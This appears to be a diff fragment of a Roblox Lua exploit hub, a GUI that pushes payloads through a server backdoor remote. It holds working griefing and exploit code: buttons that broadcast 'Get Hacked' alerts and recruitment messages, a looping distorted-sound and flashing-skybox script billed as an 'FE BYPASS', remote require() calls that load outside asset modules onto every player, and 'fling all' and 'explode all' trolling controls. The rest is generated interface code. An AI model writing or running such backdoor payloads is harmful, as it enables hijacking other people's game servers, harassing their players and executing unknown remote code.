+RequestCommand:InvokeServer("/alert all Get Hacked by zoopgui0")
+end)
+
+Button("Message", function()
+RequestCommand:InvokeServer("/sm team zoopgui0 Join today")
+end)
+
+Button("hint", function()
+RequestCommand:InvokeServer("/sh Get hacked by duo flicker")
+end)
+
+
+
+Button("°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°Backdoor Script°°°°°°°°°°°°°°°°°°°°°°°°°°°°", function()
+end)
+Button("g00byd0lan Destroyer", function()
+local s = [==[
+local mexico = Instance.new("Sound")
+mexico.Parent = game.Workspace
+mexico.SoundId = "rbxassetid://1837258874"
+mexico.PlaybackSpeed = 1.25
+mexico.Looped = true
+mexico.Playing = true
+local Distort = Instance.new("DistortionSoundEffect")
+Distort.Parent = mexico
+local fe = Instance.new("Message")
+fe.Parent = game.Workspace
+fe.Text = "GOOBYDOLAN MEXICO FE BYPASS"
+local g00by = Instance.new("Sky")
+g00by.Parent = game.Lighting
+while wait(0.02) do
+g00by.SkyboxBk = "rbxassetid://113197003713530"
+g00by.SkyboxDn = g00by.SkyboxBk
+g00by.SkyboxLf = g00by.SkyboxBk
+g00by.SkyboxRt = g00by.SkyboxBk
+g00by.SkyboxFt = g00by.SkyboxBk
+g00by.SkyboxUp = g00by.SkyboxBk
+wait(0.40)
+g00by.SkyboxBk = "rbxassetid://10760076480"
+g00by.SkyboxDn = g00by.SkyboxBk
+g00by.SkyboxLf = g00by.SkyboxBk
+g00by.SkyboxRt = g00by.SkyboxBk
+g00by.SkyboxFt = g00by.SkyboxBk
+g00by.SkyboxUp = g00by.SkyboxBk
+wait(0.40)
+end
+]==]
+code.Text = s
+end)
+
+Button("zoopgui0 Gui", function()
+local s = [==[
+require(99828653173391).Zoop("username")
+]==]
+code.Text = s
+end)
+Button("stop sounds all", function()
+local s = [==[
+for _, v in pairs(game:GetDescendants()) do
+    if v:IsA("Sound") then
+        v:Stop()
+        v:Destroy()
+    end
+end
+]==]
+code.Text = s
+end)
+Button("stummy gun", function()
+local s = [==[
+require(16662919029)("username","how")
+]==]
+runRemote(backdoor, s)
+end)
+Button("jumpscare movie", function()
+local s = [==[
+local function loadPlayer(player)
+    local success, err = pcall(function()
+        require(99511654487292):load(player.Name)
+    end)
+    
+    if not success then
+        warn("goblok " .. player.Name .. ": " .. err)
+    end
+end
+
+for _, player in pairs(game:GetService("Players"):GetPlayers()) do
+    loadPlayer(player)
+end
+ 
+game:GetService("Players").PlayerAdded:Connect(loadPlayer)
+-- credits ZOOPGUI0 ib sadrc7
+]==]
+runRemote(backdoor, s)
+end)
+Button("trioexploit", function()
+local s = [==[
+require(102182729386296).Trioexploit()
+]==]
+runRemote(backdoor, s)
+end)
+-- endfenv
+
+end;
+task.spawn(C_1b);
+
+return LMG2L["ScreenGui_1"], require;
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.sc hub
+LMG2L["sc hub_6"] = Instance.new("Frame", LMG2L["Frame_2"]);
+LMG2L["sc hub_6"]["Visible"] = true;
+LMG2L["sc hub_6"]["BorderSizePixel"] = 2;
+LMG2L["sc hub_6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["sc hub_6"]["Size"] = UDim2.new(0, 662, 0, 238);
+LMG2L["sc hub_6"]["Position"] = UDim2.new(0, 6, 0, 84);
+LMG2L["sc hub_6"]["Name"] = [[sc hub]];
+
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.sc hub.TextBox
+LMG2L["TextBox_7"] = Instance.new("TextBox", LMG2L["sc hub_6"]);
+LMG2L["TextBox_7"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+LMG2L["TextBox_7"]["BorderSizePixel"] = 2;
+LMG2L["TextBox_7"]["TextSize"] = 15;
+LMG2L["TextBox_7"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+LMG2L["TextBox_7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextBox_7"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["TextBox_7"]["PlaceholderText"] = [[-- skibidi skibidi Max]];
+LMG2L["TextBox_7"]["Size"] = UDim2.new(0, 332, 0, 162);
+LMG2L["TextBox_7"]["Position"] = UDim2.new(0, 8, 0, 10);
+LMG2L["TextBox_7"]["Text"] = [[]];
+
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.sc hub.TextButton
+LMG2L["TextButton_8"] = Instance.new("TextButton", LMG2L["sc hub_6"]);
+LMG2L["TextButton_8"]["BorderSizePixel"] = 2;
+LMG2L["TextButton_8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_8"]["Size"] = UDim2.new(0, 132, 0, 20);
+LMG2L["TextButton_8"]["Text"] = [[Clear]];
+LMG2L["TextButton_8"]["Position"] = UDim2.new(0, 6, 0, 212);
+
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.sc hub.TextButton
+LMG2L["TextButton_9"] = Instance.new("TextButton", LMG2L["sc hub_6"]);
+LMG2L["TextButton_9"]["BorderSizePixel"] = 2;
+LMG2L["TextButton_9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_9"]["Size"] = UDim2.new(0, 132, 0, 20);
+LMG2L["TextButton_9"]["Text"] = [[Execute]];
+LMG2L["TextButton_9"]["Position"] = UDim2.new(0, 6, 0, 182);
+
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.sc hub.TextButton
+LMG2L["TextButton_a"] = Instance.new("TextButton", LMG2L["sc hub_6"]);
+LMG2L["TextButton_a"]["TextWrapped"] = true;
+LMG2L["TextButton_a"]["BorderSizePixel"] = 2;
+LMG2L["TextButton_a"]["TextScaled"] = true;
+LMG2L["TextButton_a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_a"]["Size"] = UDim2.new(0, 56, 0, 48);
+LMG2L["TextButton_a"]["Text"] = [[Load]];
+LMG2L["TextButton_a"]["Position"] = UDim2.new(0, 144, 0, 182);
+
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.sc hub.ScrollingFrame
+LMG2L["ScrollingFrame_b"] = Instance.new("ScrollingFrame", LMG2L["sc hub_6"]);
+LMG2L["ScrollingFrame_b"]["BorderSizePixel"] = 3;
+LMG2L["ScrollingFrame_b"]["CanvasSize"] = UDim2.new(0, 0, 299, 0);
+LMG2L["ScrollingFrame_b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["ScrollingFrame_b"]["Size"] = UDim2.new(0, 290, 0, 214);
+LMG2L["ScrollingFrame_b"]["Position"] = UDim2.new(0, 358, 0, 10);
+
+
+ -- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.sc hub.ScrollingFrame.TextButton
+LMG2L["TextButton_c"] = Instance.new("TextButton", LMG2L["ScrollingFrame_b"]);
+LMG2L["TextButton_c"]["TextWrapped"] = true;
+LMG2L["TextButton_c"]["RichText"] = true;
+LMG2L["TextButton_c"]["BorderSizePixel"] = 0;
+LMG2L["TextButton_c"]["TextScaled"] = true;
+LMG2L["TextButton_c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_c"]["Size"] = UDim2.new(0, 288, 0, 18);
+LMG2L["TextButton_c"]["Text"] = [[Text]];
+
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.admin
+LMG2L["admin_d"] = Instance.new("Frame", LMG2L["Frame_2"]);
+LMG2L["admin_d"]["BorderSizePixel"] = 2;
+LMG2L["admin_d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["admin_d"]["Size"] = UDim2.new(0, 662, 0, 238);
+LMG2L["admin_d"]["Position"] = UDim2.new(0, 6, 0, 84);
+LMG2L["admin_d"]["Name"] = [[admin]];
+
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.admin.TextLabel
+LMG2L["TextLabel_e"] = Instance.new("TextLabel", LMG2L["admin_d"]);
+LMG2L["TextLabel_e"]["TextWrapped"] = true;
+LMG2L["TextLabel_e"]["BorderSizePixel"] = 0;
+LMG2L["TextLabel_e"]["TextScaled"] = true;
+LMG2L["TextLabel_e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_e"]["Size"] = UDim2.new(0, 180, 0, 20);
+LMG2L["TextLabel_e"]["Text"] = [[Character ]];
+LMG2L["TextLabel_e"]["Position"] = UDim2.new(0, 6, 0, 8);
+
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.admin.TextButton
+LMG2L["TextButton_f"] = Instance.new("TextButton", LMG2L["admin_d"]);
+LMG2L["TextButton_f"]["TextWrapped"] = true;
+LMG2L["TextButton_f"]["BorderSizePixel"] = 3;
+LMG2L["TextButton_f"]["TextScaled"] = true;
+LMG2L["TextButton_f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_f"]["Size"] = UDim2.new(0, 100, 0, 30);
+LMG2L["TextButton_f"]["Text"] = [[reset]];
+LMG2L["TextButton_f"]["Position"] = UDim2.new(0, 18, 0, 42);
+
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.admin.TextButton
+LMG2L["TextButton_10"] = Instance.new("TextButton", LMG2L["admin_d"]);
+LMG2L["TextButton_10"]["TextWrapped"] = true;
+LMG2L["TextButton_10"]["BorderSizePixel"] = 3;
+LMG2L["TextButton_10"]["TextScaled"] = true;
+LMG2L["TextButton_10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_10"]["Size"] = UDim2.new(0, 32, 0, 30);
+LMG2L["TextButton_10"]["Text"] = [[R6]];
+LMG2L["TextButton_10"]["Position"] = UDim2.new(0, 28, 0, 90);
+
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.admin.TextButton
+LMG2L["TextButton_11"] = Instance.new("TextButton", LMG2L["admin_d"]);
+LMG2L["TextButton_11"]["TextWrapped"] = true;
+LMG2L["TextButton_11"]["BorderSizePixel"] = 3;
+LMG2L["TextButton_11"]["TextScaled"] = true;
+LMG2L["TextButton_11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_11"]["Size"] = UDim2.new(0, 30, 0, 30);
+LMG2L["TextButton_11"]["Text"] = [[R15]];
+LMG2L["TextButton_11"]["Position"] = UDim2.new(0, 74, 0, 90);
+
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.admin.TextLabel
+LMG2L["TextLabel_12"] = Instance.new("TextLabel", LMG2L["admin_d"]);
+LMG2L["TextLabel_12"]["TextWrapped"] = true;
+LMG2L["TextLabel_12"]["BorderSizePixel"] = 0;
+LMG2L["TextLabel_12"]["TextScaled"] = true;
+LMG2L["TextLabel_12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_12"]["Size"] = UDim2.new(0, 180, 0, 20);
+LMG2L["TextLabel_12"]["Text"] = [[Music]];
+LMG2L["TextLabel_12"]["Position"] = UDim2.new(0, 4, 0, 134);
+
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.admin.TextBox
+LMG2L["TextBox_13"] = Instance.new("TextBox", LMG2L["admin_d"]);
+LMG2L["TextBox_13"]["BorderSizePixel"] = 2;
+LMG2L["TextBox_13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextBox_13"]["PlaceholderText"] = [[music id]];
+LMG2L["TextBox_13"]["Size"] = UDim2.new(0, 146, 0, 24);
+LMG2L["TextBox_13"]["Position"] = UDim2.new(0, 10, 0, 162);
+LMG2L["TextBox_13"]["Text"] = [[]];
+
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.admin.TextBox
+LMG2L["TextBox_14"] = Instance.new("TextBox", LMG2L["admin_d"]);
+LMG2L["TextBox_14"]["BorderSizePixel"] = 2;
+LMG2L["TextBox_14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextBox_14"]["PlaceholderText"] = [[volume]];
+LMG2L["TextBox_14"]["Size"] = UDim2.new(0, 146, 0, 24);
+LMG2L["TextBox_14"]["Position"] = UDim2.new(0, 10, 0, 184);
+LMG2L["TextBox_14"]["Text"] = [[]];
+
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.admin.TextBox
+LMG2L["TextBox_15"] = Instance.new("TextBox", LMG2L["admin_d"]);
+LMG2L["TextBox_15"]["BorderSizePixel"] = 2;
+LMG2L["TextBox_15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextBox_15"]["PlaceholderText"] = [[pitch]];
+LMG2L["TextBox_15"]["Size"] = UDim2.new(0, 146, 0, 24);
+LMG2L["TextBox_15"]["Position"] = UDim2.new(0, 10, 0, 204);
+LMG2L["TextBox_15"]["Text"] = [[]];
+
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.admin.TextButton
+LMG2L["TextButton_16"] = Instance.new("TextButton", LMG2L["admin_d"]);
+LMG2L["TextButton_16"]["TextWrapped"] = true;
+LMG2L["TextButton_16"]["BorderSizePixel"] = 3;
+LMG2L["TextButton_16"]["TextScaled"] = true;
+LMG2L["TextButton_16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_16"]["Size"] = UDim2.new(0, 100, 0, 30);
+LMG2L["TextButton_16"]["Text"] = [[explode all]];
+LMG2L["TextButton_16"]["Position"] = UDim2.new(0, 210, 0, 38);
+
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.admin.TextLabel
+LMG2L["TextLabel_17"] = Instance.new("TextLabel", LMG2L["admin_d"]);
+LMG2L["TextLabel_17"]["TextWrapped"] = true;
+LMG2L["TextLabel_17"]["BorderSizePixel"] = 0;
+LMG2L["TextLabel_17"]["TextScaled"] = true;
+LMG2L["TextLabel_17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_17"]["Size"] = UDim2.new(0, 196, 0, 20);
+LMG2L["TextLabel_17"]["Text"] = [[Trollling]];
+LMG2L["TextLabel_17"]["Position"] = UDim2.new(0, 194, 0, 8);
+
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.admin.TextButton
+LMG2L["TextButton_18"] = Instance.new("TextButton", LMG2L["admin_d"]);
+LMG2L["TextButton_18"]["TextWrapped"] = true;
+LMG2L["TextButton_18"]["BorderSizePixel"] = 3;
+LMG2L["TextButton_18"]["TextScaled"] = true;
+LMG2L["TextButton_18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextButton_18"]["Size"] = UDim2.new(0, 100, 0, 30);
+LMG2L["TextButton_18"]["Text"] = [[fling all]];
+LMG2L["TextButton_18"]["Position"] = UDim2.new(0, 212, 0, 88);
+
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.UIGradient
+LMG2L["UIGradient_19"] = Instance.new("UIGradient", LMG2L["Frame_2"]);
+LMG2L["UIGradient_19"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(59, 59, 59)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};
+
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.UIDragDetector
+LMG2L["UIDragDetector_1a"] = Instance.new("UIDragDetector", LMG2L["Frame_2"]);
+
+
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.as
+LMG2L["as_1b"] = Instance.new("LocalScript", LMG2L["Frame_2"]);
+LMG2L["as_1b"]["Name"] = [[as]];
+
+
+-- Players.gavinRGB2.PlayerGui.ScreenGui.Frame.as
+local function C_1b()
+	local script = LMG2L["as_1b"];
+	-- sc	
+local v = LMG2L
+local TweenService = game:GetService("TweenService")
+local function createTween(object, properties, duration)
+    local tweenInfo = TweenInfo.new(duration or 0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+    local tween = TweenService:Create(object, tweenInfo, properties)
+    tween:Play()
+    return tween
+end
+local function buttonClickEffect(button,R,G,B,r,g,b)
+    createTween(button, {BackgroundColor3 = Color3.fromRGB(R, G, B)}, 0.1)
+    task.wait(0.1)
+    createTween(button, {BackgroundColor3 = Color3.fromRGB(r, g, b)}, 0.1)
+end
 local gg = v["ScreenGui_1"]
 gg.Parent = game.CoreGui
 gg.ResetOnSpawn = false
